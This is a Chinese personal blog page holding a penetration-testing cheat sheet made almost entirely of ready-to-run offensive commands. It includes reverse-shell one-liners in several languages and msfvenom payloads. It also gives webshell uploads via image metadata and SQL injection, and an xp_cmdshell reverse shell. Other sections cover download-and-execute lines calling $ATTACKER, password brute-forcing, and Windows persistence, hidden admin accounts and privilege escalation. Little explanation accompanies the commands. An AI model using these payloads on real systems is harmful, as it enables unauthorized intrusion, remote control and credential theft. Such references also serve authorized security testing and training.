<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="懒"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>渗透测试速查表 | 忘返</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">正经人谁写日记啊。</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/links/">友链</a></li><li><span class="dot">●</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">渗透测试速查表</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/">2020-11-08</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips
</code></pre>
<h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><pre><code class="shell">#!/bin/bash
for lastOctet in &#123;1..254&#125;; do 
    ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;
done
</code></pre>
<h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><pre><code class="shell">nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
</code></pre>
<h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
</code></pre>
<h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162
</code></pre>
<h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0
</code></pre>
<h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><pre><code class="shell">whois domain.com
dig &#123;a|txt|ns|mx&#125; domain.com
dig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.com
host -t &#123;a|txt|ns|mx&#125; megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -&gt; set type=any -&gt; ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done
</code></pre>
<h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#列出NFS共享，如果存在&#39;rw,no_root_squash&#39;，可上传并执行sid-shell
showmount -e 192.168.110.102
chown root:root sid-shell; chmod +s sid-shell
</code></pre>
<h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><pre><code class="shell"># users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;
</code></pre>
<h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
</code></pre>
<h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><pre><code class="shell">rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U &quot;&quot;

# null session
rpcclient -U &quot;&quot; $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
</code></pre>
<h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><pre><code class="shell"># Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
</code></pre>
<h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
</code></pre>
<h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><pre><code class="shell"># current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group &quot;domain controllers&quot; /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:&quot;spotless&quot;

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name

# find DFS shares with ADSI
$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;

# check if spooler service is running on a host
powershell ls &quot;\\dc01\pipe\spoolss&quot;
</code></pre>
<h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><pre><code class="powershell"># Start listener on port 443
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
&#123;
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;
    $client.Close();
    start-sleep -seconds 1;
&#125;
</code></pre>
<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;

#URL-Encoded Perl: Linux
echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
</code></pre>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre>
<h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f

#2
nc localhost 443 | /bin/sh | nc localhost 444
</code></pre>
<h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444
</code></pre>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();
</code></pre>
<h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1
</code></pre>
<h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
/bin/busybox sh
</code></pre>
<p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
<h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())
</code></pre>
<p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai
</code></pre>
<h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><pre><code class="shell"># Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
# Linux
gcc -m32|-m64 -o output source.c
</code></pre>
<h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
</code></pre>
<h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py
</code></pre>
<h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
</code></pre>
<h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>file.php -&gt; file.jpg
file.php -&gt; file.php.jpg
file.asp -&gt; file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif (see below)
.jpg -&gt; proxy intercept -&gt; rename to .php
</code></pre>
<h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p>
<pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpeg
exiftool “-comment&lt;=back.php” back.png
</code></pre>
<h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><pre><code class="shell">#上传.htaccess文件将.blah文件解析为.php文件
AddType application/x-httpd-php .blah
</code></pre>
<h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p>
<pre><code># Assumed 3 columns
http://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj
</code></pre>
<p>SQLMap</p>
<pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10
</code></pre>
<p>NetCat(适用于xp_cmdshell可用的SQL Server)</p>
<pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available
1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--
</code></pre>
<h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list
</code></pre>
<h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
</code></pre>
<h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  

# Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout

# Generate NetNLTMv2 with internalMonologue and crack with hashcat
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
# resulting hash
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

# crack with hashcat
hashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
</code></pre>
<h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
</code></pre>
<h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue
$a | % &#123;
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;
    if($acls -ne $null)
    &#123;
        [pscustomobject]@&#123;
            filename = $fileName
            user = $acls | select -exp identityreference
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
</code></pre>
<h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;
</code></pre>
<h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;
</code></pre>
<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start
# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
</code></pre>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER&gt;ftp-commands.txt
echo anonymous&gt;&gt;ftp-commands.txt
echo whatever&gt;&gt;ftp-commands.txt
echo binary&gt;&gt;ftp-commands.txt
echo get file.exe&gt;&gt;ftp-commands.txt
echo bye&gt;&gt;ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd
</code></pre>
<h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
</code></pre>
<h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;
</code></pre>
<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;
powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;
powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;
powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);

# download using default proxy credentials and launch
powershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;
</code></pre>
<h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
</code></pre>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
</code></pre>
<h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attacker
nc -l -p 4444 &lt; /tool/file.exe

# Victim
nc $ATTACKER 4444 &gt; file.exe
</code></pre>
<h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
</code></pre>
<h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe
</code></pre>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><pre><code class="shell"># cmd
sc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;

# powersehll
New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;
</code></pre>
<h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><pre><code class="shell"># Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe
</code></pre>
<h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add
</code></pre>
<h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f
</code></pre>
<h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the output
accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *

sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;
sc qc [service_name] (to verify!)
sc start [service_name]
</code></pre>
<h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;
</code></pre>
<h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t
//look for (F)ull, (M)odify, (W)rite
</code></pre>
<h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><pre><code class="shell">c:\unattend.xml
c:\sysprep.inf
c:\sysprep\sysprep.xml
